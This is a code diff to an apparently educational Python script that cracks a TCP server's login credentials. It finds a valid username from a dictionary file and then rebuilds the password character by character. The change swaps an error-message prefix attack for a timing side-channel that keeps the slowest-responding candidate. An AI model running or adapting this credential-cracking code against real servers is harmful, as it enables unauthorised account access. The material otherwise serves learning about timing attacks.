@@ -1,6 +1,7 @@
 import json
 import logging
 import socket
+import time
 
 from string import ascii_letters, digits
 from argparse import ArgumentParser
@@ -13,10 +14,10 @@ LOGIN_DICTIONARY: Final[str] = "./login_dictionary.txt"
 logging.basicConfig(level=logging.DEBUG, format="%(levelname)s:%(message)s")
 
 def main() -> None:
-    """Connect to a TCP server and attempt to crack its login credentials."""
+    """Discover TCP server credentials using dictionary and timing attacks."""
 
 
-    parser: ArgumentParser = ArgumentParser(description="Discover a TCP Server's login and password using dictionary and prefix-based attacks.")
+    parser: ArgumentParser = ArgumentParser(description="Discover a TCP server's login and password using dictionary and timing-based attacks.")
 
 
     # Add command line arguments
@@ -54,25 +55,29 @@ def main() -> None:
                     if response["result"] == "Wrong password!" or response["result"] == "Exception happened during login":
                         logging.info("Valid login discovered")
 
-                        # Extend the password prefix using the server's responses.
+                        # Extend the password prefix using the slowest server response.
                         password = ""
                         while True:
+                            longest_response_time = 0.0
                             for candidate in generate_password_candidates(password):
+                                start_time = time.perf_counter()
+
                                 client_socket.sendall(create_login_request(login_variation, candidate).encode())
                                 response = json.loads(client_socket.recv(1024).decode())
 
-                                if response["result"] == "Exception happened during login":
-                                    # The server's exception response confirms a matching password prefix.
-                                    password = candidate
-                                    logging.debug("Password prefix extended to %d characters", len(password))
-                                    break
-                                elif response["result"] == "Connection success!":
+                                elapsed_time = time.perf_counter() - start_time
+
+                                if response["result"] == "Connection success!":
                                     password = candidate
                                     logging.info("Password successfully discovered")
                                     print(create_login_request(login_variation, password))
                                     return
-                            else:
-                                raise RuntimeError("No valid next password character found")
+
+                                if elapsed_time > longest_response_time:
+                                    longest_response_time = elapsed_time
+                                    password = candidate
+
+                            logging.debug("Password prefix extended to %d characters", len(password))
 
             else:
                 raise RuntimeError("No valid login found")
